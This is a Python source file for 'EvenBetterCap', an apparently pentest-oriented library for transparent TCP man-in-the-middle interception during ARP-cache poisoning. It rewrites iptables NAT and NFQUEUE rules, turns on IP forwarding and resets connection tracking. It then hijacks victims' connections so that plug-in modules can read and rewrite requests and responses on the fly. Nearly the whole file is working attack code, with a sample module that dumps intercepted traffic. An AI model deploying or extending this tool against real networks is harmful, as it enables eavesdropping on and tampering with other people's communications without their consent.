#!/usr/bin/python
'''
	EvenBetterCap: 			A modularized transparent TCP & UDP proxy, for editing packets on the fly in arp-cache
							poisoning attacks. This is a solution in response to bettercap's requirement to know 
							the "upstream" proxy address at the time of setup in order to perform a true TCP mitm. 
							However, that knowledge is hard to come by ahead of time, and it limits the attack to 
							only one "upstream" server at a time.
						
							EvenBetterCap(EBC) allows you to mitm multiple tcp/udp connection(s) with varying destinations
							in parallel, without knowing the victim's destination ahead of time.

							EBC was written with simplicity in mind; To make it as simple as possible for pentesters to
							write their own modules to parse and/or modify TCP/UDP packets in a MiTM attack. 
							The library is only composed of two components: the MiTMServer, and the MiTMModule.

							MiTMModule's are the plug-and-play objects that actually parse and edit the victim's requests 
							and the server's responses in a TCP/UDP MiTM attack. To create your own, simply declare
							a child class of MiTMModule, and re-define the parseClientRequest and parseServerResponse methods.
							Checkout the ExampleMod as an example, or the sampleMitmServer.py file for a clearer example of how
							to use EBC.
Author: @Quickbreach
'''

import logging
from scapy.all import IP, TCP, UDP
import netfilterqueue
import copy
import random
import string
import socket
import traceback
import threading
import subprocess
import netifaces
from multiprocessing import Manager
import Queue
import copy
import os
from threading import Thread
from binascii import hexlify

VERSION = "1.0.0"

# A small struct/class to more easily manage existing/new connections
class Connection(object):
	def __init__(self, client_ip = "", server_ip = "", client_port = 0, server_port = 0, protocol = "TCP", interface = ""):
		self.client_ip 		= client_ip
		self.server_ip 		= server_ip
		self.client_port 	= client_port
		self.server_port 	= server_port
		self.protocol 		= protocol.lower()
		self.interface 		= interface

	# This returns just the source address & port in a string format
	# so that it can be hashed and tied back to the connectionManager.
	# The protocol, source address, and port are the only shared pieces of information
	# that both the MiTMModule socket and nfqueue intercept have access to, so
	# nfqueue hashes this info together and uses that hash as the key in the 
	# connectionMnaager. Once the MiTMModule recieves the intercepted connection,
	# it will hash the proto/source ip/port to pull back the whole Connection
	# object from the connectionManager - and thus - have the destination ip and port
	# to then behave like a fully transparent TCP/UDP MiTM server.
	def getMark(self):
		return "[" + str(self.protocol.upper()) + "] " + str(self.client_ip) + ":" + str(self.client_port)

	def __eq__(self, other):
		# client to server
		if(self.client_ip == other.client_ip): 
			if(self.server_ip == other.server_ip): 
				if(self.client_port == other.client_port): 
					if(self.server_port == other.server_port): 
						return True
		return False

	def __str__(self):
		return "[" + str(self.protocol.upper()) + "] " + str(self.client_ip) + ":" + str(self.client_port) + " -> " + str(self.server_ip) + ":" + str(self.server_port)

# MiTMServer - A fully modular and transparent UDP/TCP proxy server that leverages nfqueue and iptables to run mitm attacks
#	Usage:
#	0. Setup a bi-directional arp-cache poisoning attack with ip_forwarding enabled on your machine (Pro tip: run "sysctl net.ipv4.ip_forward=1")
#	1. Declare an instance of a MiTMModule
#	2. Declare an instance of a MiTMServer as 'MiTMServer(desired_port, either "TCP" or "UDP", MiTMModule_instance, T/F for newInstance)'
#	3. MiTMServer.start() -- you can run multiple servers with different ports in multiple threads
# 	4. Profit
class MiTMServer(Thread):
	# Required arguments:
	#	[int] 		port  - the port on which to hijack connections
	#	[str] 		protocol  - either "TCP" or "UDP"
	#	[str] 		iface - the interface to run the attack on
	#	[object]	mitmInstance - an instance of a MiTMModule
	# Optional:
	#	[bool] 		newInstance - 	T/F on if each new connection should be handled by 
	#								a new instance of the MiTMModule passed, or (false) if all 
	#								connections should be handled by the same instance. 
	def __init__(self, port, protocol, iface, mitmInstance, newInstance = False):
		logging.getLogger(__name__).addHandler(logging.NullHandler())
		self.logger = logging.getLogger(__name__)
		self.logger.setLevel(logging.ERROR)

		self.port 				= int(port)
		self.protocol 			= protocol.upper()
		self.interface			= iface
		self.mitmInstance 		= mitmInstance
		self.myIp 				= netifaces.ifaddresses(self.interface)[2][0]['addr']

		self.newInstance 		= newInstance # Every new connection should/should not be handled by a new copy of the mitmInstance

		if(self.protocol.upper() == "TCP"):
			self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		else:
			self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		
		self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.sock.bind((self.myIp, self.port))

		z = Manager()
		self.connectionManager 	= z.dict()
		self.iptablesFlag 		= "MiTMServer_" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(12))
		self.nfqueueNum 		= random.randint(2000, 9999)
		self.nfqueueThread 		= threading.Thread(target = self.nfqueueBinder)

		self.myThreads 			= []

		super(MiTMServer, self).__init__()
		pass
	
	# Deep copy data and/or objects, with exceptions of shared-memory-objects like proxydicts (which get shallow copied)
	def smartCopy(self, data):
		if(type(data) == dict):
			newDict = dict()
			for key, item in data.iteritems():
				newDict[key] = self.smartCopy(item)
			return newDict
		if(type(data) == list):
			newLs = []
			for item in data:
				newLs.append(self.smartCopy(item))
			return newLs

		retData = None
		try:
			# 
			if(type(data) == multiprocessing.Manager().dict()): raise(Exception(""))
			# 
			if(type(data) == threading.Lock()): raise(Exception(""))
			retData = copy.deepcopy(data)
		except:
			try:
				retData = copy.copy(data)
			except:
				retData = data
		return retData
	
	# Prep the firewall for NFqueue + redirection with arp-cache poisoning in mind
	def openFirewall(self):
		self.logger.debug("[ebcLib.py] Modifying firewall rules for "+self.protocol + "/" + str(self.port)+" attack")
		cmds = []

		# Set up IP forwarding
		cmds.append("sysctl net.ipv4.ip_forward=1")
		# Disable sending redirects
		cmds.append("echo 0 | tee /proc/sys/net/ipv4/conf/*/send_redirects")
		# Allow forwarding through the firewall
		cmds.append("iptables -A FORWARD -m comment --comment " + self.iptablesFlag + " -j ACCEPT")

		# Nfqueue intercepts every NEW connection and 
		# processes it with nfqueueHandler before 
		# passing it on to the actual mitmInstance server
		cmds.append("iptables -t nat -A PREROUTING" + \
					" -i " + self.interface + \
					" -p " + self.protocol.lower() + \
					" --dport " + str(self.port) + \
					" -m mark ! --mark " + str(self.nfqueueNum) + \
					" -m conntrack --ctstate NEW" + \
					" -j NFQUEUE --queue-num " + str(self.nfqueueNum) + \
					" -m comment --comment " + self.iptablesFlag)

		# After nfqueue is done with it, it gets passed 
		# to the MiTMServer.listen() method
		cmds.append("iptables -t nat -A PREROUTING" + \
					" -i " + self.interface + \
					" -p " + self.protocol.lower() + \
					" --dport " + str(self.port) + \
					" -j DNAT --to " + self.myIp + ":" + str(self.port) + \
					" -m comment --comment " + self.iptablesFlag)

		# Accept the routed packets to the MiTMServer.listen()
		# function, which will then start a thread of the listenToClient
		# function to 'be in charge' of this connection and directly handle 
		# every subsequent message until the connection is closed
		cmds.append("iptables -A INPUT" + \
					" -i " + self.interface + \
					" -p " + self.protocol.lower() + \
					" --dport " + str(self.port) + \
					" -m comment --comment " + self.iptablesFlag + \
					" -j ACCEPT")

		# Masquerade our IP when we reply to the victim
		cmds.append("iptables -t nat -I POSTROUTING -s 0/0 -j MASQUERADE -m comment --comment " + self.iptablesFlag)

		# Reset any existing connections so that they get picked up by our intercept
		cmds.append("conntrack -D -p " + self.protocol.upper() + " --sport " + str(self.port))
		cmds.append("conntrack -D -p " + self.protocol.upper() + " --dport " + str(self.port))

		# Run all of the commands spelled out above
		for z in cmds:
			self.logger.debug("[ebcLib.py] Running command: " + z)
			c = subprocess.Popen(z.split(" "), stdout = subprocess.PIPE, stderr = subprocess.PIPE)
			c.communicate()
	
	# Roll back our firewall changes
	def closeFirewall(self):
		self.logger.info("[ebcLib.py] Removing firewall rules from "+self.protocol + "/" + str(self.port)+" attack")
		cmds = []

		# Undo everything from the MiTMServer.openFirewall function
		cmds.append("iptables -D FORWARD -m comment --comment " + self.iptablesFlag + " -j ACCEPT")

		# Undo everything from the MiTMServer.openFirewall function
		cmds.append("iptables -t nat -D PREROUTING" + \
					" -i " + self.interface + \
					" -p " + self.protocol + \
					" --dport " + str(self.port) + \
					" -m mark ! --mark " + str(self.nfqueueNum) + \
					" -m conntrack --ctstate NEW" + \
					" -j NFQUEUE --queue-num " + str(self.nfqueueNum) + \
					" -m comment --comment " + self.iptablesFlag)

		# Undo everything from the MiTMServer.openFirewall function
		cmds.append("iptables -t nat -D PREROUTING" + \
					" -i " + self.interface + \
					" -p " + self.protocol + \
					" --dport " + str(self.port) + \
					" -j DNAT --to " + self.myIp + ":" + str(self.port) + \
					" -m comment --comment " + self.iptablesFlag)

		# Undo everything from the MiTMServer.openFirewall function
		cmds.append("iptables -D INPUT" + \
					" -i " + self.interface + \
					" -p " + self.protocol.lower() + \
					" --dport " + str(self.port) + \
					" -m comment --comment " + self.iptablesFlag + \
					" -j ACCEPT")

		# Undo everything from the MiTMServer.openFirewall function
		cmds.append("iptables -t nat -D POSTROUTING -s 0/0 -j MASQUERADE -m comment --comment " + self.iptablesFlag)

		# Run the commands
		for z in cmds:
			self.logger.debug("[ebcLib.py] Running command: " + z)
			c = subprocess.Popen(z.split(" "), stdout = subprocess.PIPE, stderr = subprocess.PIPE)
			c.communicate()
		self.logger.debug("[ebcLib.py] Firewall restored from "+self.protocol + "/" + str(self.port)+" attack")
	
	# This recieves the new connections from the victim - 
	# and grabs the dest ip & dest port & passes it on to the intercept servers
	# allowing for transparency
	def nfqueueHandler(self, packet):
		pkt 	= IP(packet.get_payload()) 			#Converts the raw packet to a scapy object
		target 	= pkt.dst
		victim 	= pkt.src
		nc 		= Connection(pkt.src, pkt.dst, pkt[self.protocol].sport, pkt[self.protocol].dport, self.protocol, self.interface) 
		key 	= hash(str(nc.getMark()))
		self.connectionManager[key] = nc

		# Mark the packet so nfqueue won't touch it on the next iteration
		packet.set_mark(self.nfqueueNum)
		# Now that we've recoreded and marked the packet,
		# let's have the kernel present the packet to us again as if it were new. 
		# This time NFqueue won't touch it, and it will be passed to the intercept servers
		packet.repeat()
		return

	# This gets seperated off into a thread, it runs nfqueue
	# which is the most critical part. Without it, the proxy
	# cannot be transparent
	def nfqueueBinder(self):
		self.logger.debug("[ebcLib.py] Binding nfqueue...")
		nfqueue = netfilterqueue.NetfilterQueue()
		nfqueue.bind(self.nfqueueNum, self.nfqueueHandler)
		nfqueue.run()

	# This listens for new requests and handles them
	# TCP - forks them off to their own threads
	# UDP - directly calls the mitmInstance since it's a "stateless" protocol
	def listen(self):
		try:
			# Open up the firewall
			self.openFirewall()
			# Start up nfqueue bind
			self.nfqueueThread.daemon = True
			self.nfqueueThread.start()
			# Start up the TCP intercept server
			if(self.protocol == "TCP"):
				self.sock.listen(5)
				self.logger.info("[ebcLib.py] Started " + self.protocol + "/" + str(self.port) + " intercept server")
				while True:
					client, address = self.sock.accept()
					client.settimeout(60)
					self.myThreads.append(threading.Thread(target = self.victimHandler, args = (client, address)))
					self.myThreads[-1].daemon = True
					self.myThreads[-1].start()
			'''
			# TODO: Add UDP support
			if(self.protocol == "UDP"):
				self.logger.info("Starting " + self.protocol + "/" + str(self.port) + " intercept server...")
				while True:
					data, address = self.sock.recvfrom()
					# Check if nfqueue was able to grab the important info
					nc = Connection(str(address[0]), '', int(address[1]), '', self.protocol, self.interface) 
					key = hash(str(nc.getMark()))
					if key not in self.connectionManager:
						self.logger.debug("Connection was not found in nfqueue populated dict")
						continue
					resp = self.mitmInstance.run_mitm(data)
					self.sock.sendto(resp, (address[0], address[1]))
			'''	
		except KeyboardInterrupt:
			self.logger.debug("[ebcLib.py] Shutting down......")
			self.shutdown()
			return
		self.shutdown()
		return
	
	# This is the thread in which a hijacked TCP/UDP connection is
	# handled in its own thread
	def victimHandler(self, client, address):
		try:
			size = 9999
			mitmObject = self.mitmInstance
			# Check if nfqueue was able to grab the dest address & dest port info
			nc = Connection(str(address[0]), '', int(address[1]), '', self.protocol, self.interface)
			key = hash(str(nc.getMark()))
			if key not in self.connectionManager:
				self.logger.debug("[ebcLib.py] Connection was not found in nfqueue populated dict")
				return False
			else:
				self.logger.info("[ebcLib.py] Hijacked " + self.protocol.upper() + " connection between " + str(self.connectionManager[key]))

			# If a new instance should be used in each new connection, 
			# then create a new deepcopy of the original un-touched mitmInstance
			if self.newInstance == True:
				mitmObject = self.mitmInstance.__class__() 
				for member in dir(self.mitmInstance):
					if not callable(getattr(self.mitmInstance, member)) and not member.startswith("__"):
						setattr(mitmObject, str(member), self.smartCopy(getattr(self.mitmInstance, member)))		

			# Provide the mitmObject with all of the data it needs to perform the attack
			mitmObject.MiTMModuleConfig['Connection'] 			= self.connectionManager[key]
			mitmObject.MiTMModuleConfig['clientRequestQueue'] 	= Queue.Queue()
			mitmObject.MiTMModuleConfig['hackedRequestQueue'] 	= Queue.Queue()
			mitmObject.MiTMModuleConfig['serverResponseQueue'] 	= Queue.Queue()
			mitmObject.MiTMModuleConfig['hackedResponseQueue'] 	= Queue.Queue()

			# These exist for connections where the data does not have a 1:1 ratio of send to recieve
			# ie. the client sends 1 request and the server sends two replies
			theListener = ASyncReciever(client, mitmObject.MiTMModuleConfig['clientRequestQueue'], self.connectionManager[key])
			theSender 	= ASyncSender(client, mitmObject.MiTMModuleConfig['hackedResponseQueue'], self.connectionManager[key])
			theListener.daemon 	= True
			theSender.daemon 	= True
			theSender.start()
			theListener.start()


			mitmObject.run_mitm()
			try:
				while theListener.isAlive():
					# theListener disregards '-1', so this join does nothing
					theListener.join(-1)
			except KeyboardInterrupt:
				theListener.join(0)
				theSender.join(0)
			except:
				theListener.join(0)
				theSender.join(0)
			return
		except KeyboardInterrupt:
			if theListener is not None and theListener.isAlive():
				theListener.join(0)
			if theSender is not None and theSender.isAlive():
				theSender.join(0)
		return

	# Reset the firewall, kill the threads, etc
	def shutdown(self):
		self.closeFirewall()
		return

	# Called by the parent Thread class "start" function
	def run(self):
		self.listen()

	# If the timeout == -1, then this does nothing
	# otherwise, it initiates the shutdown
	def join(self, timeout=None):
		if timeout == -1:
			return
		self.shutdown()
		super(MiTMServer, self).join(timeout)


# Split the data returned into 1500 byte chunks to prevent python from crashing
def splitData(data, length = 1500):
	return (data[0+i:length+i] for i in range(0, len(data), length))

class ASyncSender(Thread):
	def __init__(self, client, serverResponseQueue, connectionInfo):
		logging.getLogger(__name__).addHandler(logging.NullHandler())
		self.logger = logging.getLogger(__name__)
		self.client = client
		self.serverResponseQueue = serverResponseQueue
		self.connInfo = connectionInfo
		super(ASyncSender, self).__init__()

	def sendToClient(self):
		while True:
			try:
				data = self.serverResponseQueue.get()
				if(data == None or len(data) == 0):
					continue
				self.client.sendall(data)
			except KeyboardInterrupt:
				self.client.close()
				return False
				break
			except Exception, e:
				# self.logger.info("[ASyncSender::sendToClient] " + str(e) + traceback.format_exc())
				self.logger.debug("[ebcLib.py] Victim disconnected: [END] " + str(self.connInfo))
				self.client.close()
				return False
	def run(self):
		self.sendToClient()

	def join(self, timeout=None):
		if timeout == -1:
			return
		try:
			self.client.shutdown()
			self.client.close()
		except Exception, e:
			pass
		super(ASyncSender, self).join(timeout)
class ASyncReciever(Thread):
	def __init__(self, client, clientRequestQueue, connectionInfo):
		logging.getLogger(__name__).addHandler(logging.NullHandler())
		self.logger = logging.getLogger(__name__)
		self.client = client
		self.clientRequestQueue = clientRequestQueue
		self.connInfo = connectionInfo
		super(ASyncReciever, self).__init__()
	def listenToClient(self):
		while True:
			try:
				data = self.client.recv(4096)
				if(data == None or len(data) == 0):
					continue
				self.clientRequestQueue.put(data)
			except KeyboardInterrupt:
				self.client.close()
				return False
				break
			except Exception, e:
				self.logger.info("[ebcLib.py] Victim disconnected: [END] " + str(self.connInfo))
				self.client.close()
				return False
	def run(self):
		self.listenToClient()
	def join(self, timeout=None):
		if timeout == -1:
			return
		try:
			self.client.shutdown()
			self.client.close()
		except Exception, e:
			try:
				self.client.close()
			except:
				pass
			pass
		super(ASyncReciever, self).join(timeout)

# MiTMModule - The backbone MiTMModule for the MiTMServer. To use it,
# define a child class and then re-define only the parseClientRequest and parseServerResponse functions to fit your needs.
# These methods will be passed the raw data from within the intercepted TCP/UDP packet - not the TCP/UDP packet itself.
#
# Bonus feature: You can also re-define the "setup(self): " function. It will be called at the end of the init function,
#					which allows you to easily initialize globale variables that can be used by the parseClientRequest and
#					parseServerResponse functions.
#
# See the ExampleMod class for an example
#
# The returned data from these functions will be swapped into the original TCP/UDP packet and sent onwards
class MiTMModule(object):	
	# Opens the connection for us to use to communicate 
	# with the target server, then starts the threads for listening
	# & sending
	def run_mitm(self):

		clientHandler = None
		serverHandler = None
		try:
			if self.MiTMModuleConfig['Connection'].protocol == "udp":
				self.NETClient = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				return
			elif self.MiTMModuleConfig['Connection'].protocol == "tcp":
				NETClient	= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				NETClient.connect((self.MiTMModuleConfig['Connection'].server_ip, self.MiTMModuleConfig['Connection'].server_port))

				sender 		= ASyncSender(NETClient, self.MiTMModuleConfig['hackedRequestQueue'], self.MiTMModuleConfig['Connection'])
				listener 	= ASyncReciever(NETClient, self.MiTMModuleConfig['serverResponseQueue'], self.MiTMModuleConfig['Connection'])

				listener.daemon 	= True
				sender.daemon 		= True
				listener.start()
				sender.start()

				clientHandler = Thread(target = self.threadListenForRequests)
				serverHandler = Thread(target = self.threadListenForResponses)
				
				clientHandler.daemon = True
				serverHandler.daemon = True

				clientHandler.start()
				serverHandler.start()
				try:
					if(clientHandler == None):
						return
					if(serverHandler == None):
						return
					while clientHandler.isAlive():
						# theListener disregards '-1', so this join does nothing
						clientHandler.join(-1)

					
					while serverHandler.isAlive():
						# theListener disregards '-1', so this join does nothing
						serverHandler.join(-1)

				except KeyboardInterrupt:
					clientHandler.join(0)
					serverHandler.join(0)
				return
			else:
				raise Exception("Only SOCK_STREAM and SOCK_DGRAM are supported!")
		except Exception, e:
			# self.logger.error("[" + self.__class__.__name__ + "::run_mitm] " + str(e) + traceback.format_exc())
			if clientHandler is not None and clientHandler.isAlive():
				clientHandler.join(0)
			if serverHandler is not None and serverHandler.isAlive():
				serverHandler.join(0)
		return

	def threadListenForRequests(self):
		while True:
			try:
				req = self.parseClientRequest(self.MiTMModuleConfig['clientRequestQueue'].get())
				if (req == None or len(req) == 0):
			 		continue
				for z in splitData(req):
					self.MiTMModuleConfig['hackedRequestQueue'].put(z)
			except Exception, e:
			 	self.logger.error("[" + self.__class__.__name__ + "::threadListenForRequests] " + str(e) + " " + str(traceback.format_exc()))
		pass
	def threadListenForResponses(self):
		while True:
			try:
			 	resp = self.parseServerResponse(self.MiTMModuleConfig['serverResponseQueue'].get())
			 	if (resp == None or len(resp) == 0):
			 		continue
			 	for z in splitData(resp):
					self.MiTMModuleConfig['hackedResponseQueue'].put(z)
			except Exception, e:
			 	self.logger.error("[" + self.__class__.__name__ + "::threadListenForResponses] " + str(e) + " " + str(traceback.format_exc()))
		pass
	
	# Closes the connection and sets NETClient to None
	def closeConnection(self):
		if self.MiTMModuleConfig['protocol'] == socket.SOCK_STREAM:
			self.NETClient.close()
		self.NETClient = None
	# (optional) Use this after init to pass custom variables to the instance. Access them with 
	# self.info['MyVarName']
	def addCustomData(self, **kwargs):
		# Add each piece of data to the global "info" dictionary 
		for key in kwargs:
			self.info[key] = kwargs[key]
	# (optional) Re-define this function and use it as a make-shift init(). This function will be called with no arguments
	# once - right after the object is initalized. Use it to establish global variables and such for the instance.
	def setup(self):
		#self.myCustomVar = 30
		#self.statefulVariable = "you get the idea"
		#self.Useful = True #probably
		pass
	# (required) This returns the hacked request that will be sent to the real server
	def parseClientRequest(self, request):
		# Override this function as a child class
		raise Exception("[MiTMModule] This is not how to use the MiTMModule class! You must define a child class of it, and then re-define parseClientRequest and parseServerResponse")
		return request
	# (required) Returns the hacked response sent to the real client
	def parseServerResponse(self, response):
		# Override this function as a child class
		raise Exception("[MiTMModule] This is not how to use the MiTMModule class! You must define a child class of it, and then re-define parseClientRequest and parseServerResponse")
		return response
	# Don't worry about any of this - all of this is filled in by the MiTMServer
	def __init__(self):
		
		self.MiTMModuleConfig = dict()
		# Trust me, leave this as None and let the initConnection and resetConnection methods
		# handle this from inside the threads they run within 
		self.NETClient	= None
		self.info 		= dict()

		# Run the setup function, in the event it may have been re-defined
		self.setup()
		return


# ExampleMod - an example of how to use the MiTMModule
# 1. Define a child class 
# 2. Re-define the parseClientRequest and parseServerResponse functions to fit your needs of data editing/etc. Make each function
#		return the replacement data for the packet which will be sent over to the legitimate destination.
# 3. Profit
class ExampleMod(MiTMModule):
	
	# Modify the data sent from the client to the server
	def parseClientRequest(self, request):
		print("Client request:\n" + hexlify(request))
		# Modify the "request" data here, and then send it over to the server
		return request
	
	# Modify the data sent from the server back to the client
	def parseServerResponse(self, response):
		print("Server response:\n" + hexlify(response))
		# Modify the "response" data here, and then send it over to the client
		return response
